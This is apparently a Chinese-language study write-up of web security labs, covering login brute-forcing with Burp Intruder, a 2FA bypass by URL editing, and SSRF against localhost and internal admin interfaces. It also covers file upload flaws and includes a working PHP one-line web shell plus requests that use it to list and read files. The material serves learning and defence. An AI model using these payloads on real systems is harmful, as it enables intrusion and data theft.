## 一、暴力破解攻击

暴力破解攻击是指攻击者通过反复试验来猜测有效的用户凭证。这些攻击通常通过用户名和密码的单词列表进行自动化。通过自动化这一过程，尤其是使用专用工具，攻击者能够高速进行大量登录尝试。

暴力破解并不总是完全随机猜测用户名和密码。通过利用基本逻辑或公开知识，攻击者可以微调暴力破解攻击，做出更有根据的猜测，这大大提高了此类攻击的效率。依赖基于密码登录的唯一身份验证方式的网站，如果没有实施足够的暴力破解防护，可能会极易受到攻击。

### 实操

**第一步：枚举用户名**

先随机输入用户名和密码，用 Burp 抓包。

抓取登录的 POST 请求发送到 Intruder，Sniper 模式下只给 username 参数的值加 `§` 标记，password 保留任意静态值。加载候选用户名字典后 Start attack。

攻击结束后按 **Length 列**排序，发现一条响应明显与其他不同。

**第二步：爆破密码**

## 二、绕过双因素认证

有时，双因素认证（2FA）的实现存在缺陷，甚至可以被完全绕过。

如果用户先被要求输入密码，随后在**另一个单独的页面上**被要求输入验证码，那么在输入验证码之前，用户实际上就已经处于"已登录"状态了。这种情况下，值得测试一下：**完成第一步认证（输完密码）后，能否直接跳转到"仅限登录后"的页面**。偶尔你会发现，网站在加载这些页面前根本没有校验用户是否完成了第二步。

### 实操：2FA 简单绕过

输入目标账户和密码，发现存在二次认证。

![2FA 绕过实操（一）：完成密码认证后出现二次验证页面](/img/auth-ssrf-upload-3.png)

直接手动修改 URL 跳转到登录后的页面。

![2FA 绕过实操（二）：直接 URL 导向跳过验证码，成功进入登录后页面](/img/auth-ssrf-upload-4.png)

## 三、SSRF：服务端请求伪造

### 什么是 SSRF

服务端请求伪造（Server-side request forgery，SSRF）是一种 Web 安全漏洞，允许攻击者**诱使服务端应用向非预期的位置发起请求**。

在典型的 SSRF 攻击中，攻击者可能让服务器去连接**组织内部基础设施中仅限内网访问的服务**；在另一些情况下，攻击者还能强制服务器连接**任意的外部系统**，从而泄露敏感数据，比如认证凭据。

简单来说，如果这个服务器有某些文件下载传输功能（服务器一般一只脚在内网，一只脚在外网），攻击者可以让服务器访问内网里的地址。因为服务器在内网里一般是畅通的，攻击者可以借助服务器在内网的访问得到数据。

### 针对服务器本机的 SSRF

在针对服务器的 SSRF 攻击中，攻击者使应用程序通过环回网络接口向托管该应用的服务器发送 HTTP 请求。这通常涉及提供一个带有如下主机名的 URL：`127.0.0.1`（指向环回适配器的预留 IP 地址）或 `localhost`（同一适配器常用的名称）。

例如，想象一个购物应用，允许用户查看某商品在某家门店是否有库存。为了提供库存信息，应用程序必须查询各种后端 REST API。它通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现这一点。当用户查看某项商品的库存状态时，浏览器会发出以下请求：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

这会导致服务器向指定的 URL 发送请求，获取库存状态，并返回给用户。

在这个例子中，攻击者可以修改请求，指定服务器本地的 URL：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

服务器会获取 `/admin` 的内容并将其返回给用户。

攻击者通常也可以直接访问 `/admin`，但管理功能一般只对已认证用户开放，这意味着攻击者看不到任何有价值的东西。然而，如果对 `/admin` 的请求**来自本机**，常规的访问控制就会被绕过：应用程序授予对管理功能的完全访问权限，因为请求看起来来自可信位置。

应用为什么会这样表现——**默认信任来自本机的请求**？可能出于多种原因：

1.  **访问控制检查在另一个组件里。** 这个组件位于应用服务器之前（比如反向代理）。当请求"绕回"服务器自身时（连接直接打到应用服务器，不再经过前置组件），检查就被跳过了。
2.  **灾难恢复预留的后门。** 为了容灾，应用可能允许**从本机发起的连接不经登录直接获得管理权限**——万一管理员丢了凭据，还能从服务器上登进系统自救。这个设计的前提假设是：**只有完全可信的人才会直接从服务器本机发起连接**。
3.  **管理接口监听在不同端口上。** 管理接口可能跑在主应用之外的另一个端口，用户根本无法直接访问到它。

这种**信任关系**——来自本机的请求被区别对待、优于普通请求——往往使 SSRF 成为**严重（critical）级别的漏洞**。

### 针对其他后端系统的 SSRF

在某些情况下，应用服务器能够与一些**用户无法直接访问到的后端系统**交互。这些系统通常使用**不可路由的私有 IP 地址**。后端系统一般由**网络拓扑结构**保护着，因此它们的安全防护往往**更薄弱**。很多时候，内部后端系统包含敏感功能，**任何能与之交互的人都可以不经认证直接访问**。

在前面的例子中，假设某个后端地址 `http://192.168.0.68/admin` 上有一个管理接口。攻击者可以提交以下请求来利用 SSRF 漏洞，访问该管理接口：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

### 实操：内网扫描

利用 Intruder 对 `192.168.0.X:8080` 网段进行爆破，找到异常响应，扫出存活主机 `192.168.0.155:8080`。

![内网 SSRF 实操（一）：Intruder 扫描内网网段，按响应长度区分存活主机](/img/auth-ssrf-upload-7.png)

![内网 SSRF 实操（二）：在扫出的 192.168.0.155:8080 上发现管理接口](/img/auth-ssrf-upload-8.png)

> **两种 SSRF 的信任来源略有区别：**
>
> 第一种信任原因是请求来自本机（`127.0.0.1` 或 `localhost`）；
>
> 第二种信任原因是内网本身不设防，默认连接到内网的是可信的。

## 四、文件上传漏洞

### 什么是文件上传漏洞

文件上传漏洞是指 Web 服务器允许用户向其文件系统上传文件，却**没有充分验证文件的名称、类型、内容或大小**。如果不能正确执行这些限制，哪怕只是一个基础的图片上传功能，也可能被用来上传**任意甚至危险的文件**——包括能在服务端执行的脚本文件，从而实现**远程代码执行（RCE）**。

在某些情况下，**上传这个动作本身就足以造成危害**；另一些攻击则需要**后续发起一个针对该文件的 HTTP 请求**，通常是为了触发服务器执行它。

> 此类漏洞在 CTF 中是十分常见的题型。

### 文件上传漏洞是如何产生的

考虑到文件上传的危险显而易见，真实网站里**完全没有任何限制**的情况很少见。更常见的情况是：开发者实现了一套**自以为健壮的验证，但它要么本身就有缺陷，要么很容易被绕过**。

例如，开发者可能尝试用**黑名单**拦截危险的文件类型，但在检查文件扩展名时**没有考虑到解析差异**；而且和任何黑名单一样，很容易**遗漏一些更冷门但依然危险的文件类型**。

另一些情况下，网站会通过验证某些**属性**来判断文件类型——而这些属性可以被攻击者用 Burp Proxy、Repeater 之类的工具**轻易篡改**。

最终，即使是健壮的验证措施，也可能在构成网站的**多台主机、多个目录之间执行得不一致**，由此产生的**差异（discrepancy）**就可以被利用。

### 文件类型验证的缺陷（Flawed file type validation）

普通表单用 `application/x-www-form-urlencoded`（纯文本编码），传不了二进制数据；文件上传必须用 **`multipart/form-data`**，请求体被 boundary（边界线）切分成多个格子，每格一个表单字段：

```
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryXg7TvA8b9mKpL2qN
------WebKitFormBoundaryXg7TvA8b9mKpL2qN
Content-Disposition: form-data; name="avatar"; filename="cat.png"   ← 文件名声明
Content-Type: image/png    ← 类型声明
[二进制内容]

------WebKitFormBoundaryXg7TvA8b9mKpL2qN
Content-Disposition: form-data; name="user"
wiener
------WebKitFormBoundaryXg7TvA8b9mKpL2qN--
```

**`filename`、`Content-Type`、文件内容，全部由发送方填写。**

#### 三个字段

| 字段 | 起作用的阶段 | 决定什么 |
| --- | --- | --- |
| Content-Type | 只在上传检查时 | 门卫放不放 |
| filename（扩展名） | 存储 + 执行时 | 服务器**怎么对待**这个文件（是否当代码执行） |
| 内容 | 执行时 | 执行后**发生什么** |

### 网站的验证手法与绕过

**① 谎报 Content-Type**：服务器只信请求里声明的 `image/jpeg`。

**② 解析差异 / 漏网扩展名**：`.php` 被拦了，还有 `.php5`、`.phtml`、`.phar`。

**③ 图片马**：服务器检查文件头字节（PNG 是 `89 50 4E 47`），那就拼一个"真图片头 + 尾部 PHP 代码"的合成文件。

### Web Shell 与一句话木马

文件上传漏洞中危害最大的是 Web Shell（网页木马），最简单的形式是一句话木马。

网站允许你上传**服务端脚本**（如 PHP、Java、Python 文件），**并且服务器配置为把它们当代码执行**。这种情况下，在服务器上创建自己的 Web Shell 就是轻而易举的事。

**Web Shell（网页木马）**：一种恶意脚本，攻击者只需**向正确的端点发送 HTTP 请求**，就能在远程 Web 服务器上**执行任意命令**。

如果成功上传了 Web Shell，你就**实际上完全控制了服务器**——可以读写任意文件、窃取敏感数据，甚至**以这台服务器为跳板**攻击内部基础设施和网络外的其他服务器。

例如，下面这个 PHP 单行代码可以读取服务器文件系统中的任意文件：

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

上传后，只要请求这个恶意文件，目标文件的内容就会出现在响应里。

一个更通用的 Web Shell 长这样：

```
<?php echo system($_GET['command']); ?>
```

*   `$_GET['command']`：从 URL 查询参数里取值——**命令是攻击者现场指定的**；
*   `system()`：PHP 内置函数，把字符串当**操作系统命令**执行，返回输出；
*   `echo`：把命令输出回显到 HTTP 响应里。

访问 `exploit.php?command=id` 时，服务器实际执行的是 `id`（Linux 命令，显示当前用户身份），输出直接回到你的浏览器。把 `command` 换成 `cat /etc/passwd`、`ls /`、`whoami`……**整个服务器的命令行就在你的地址栏里了**。

### 实操：一句话木马

创建 PHP 文件并上传：

```
<?php echo system($_GET['command']); ?>
```

通过 Linux 指令列目录：

```
GET /files/avatars/php-lab1.php?command=ls+/home/carlos/secret HTTP/2
```

> 原指令是 `GET /files/avatars/php-lab1.php?command=ls /home/carlos/secret HTTP/2`，但在 URL 里空格需要转义。两种写法：
>
> `%20` 是空格的 URL 编码；`+` 在查询参数里等效。

![Web Shell 实操（一）：上传 PHP 一句话木马，用 ls 命令列出目标目录](/img/auth-ssrf-upload-10.png)

查看文件内容：

```
GET /files/avatars/php-lab1.php?command=cat%20/home/carlos/secret HTTP/2
```

![Web Shell 实操（二）：cat 读取 /home/carlos/secret 文件内容](/img/auth-ssrf-upload-11.png)
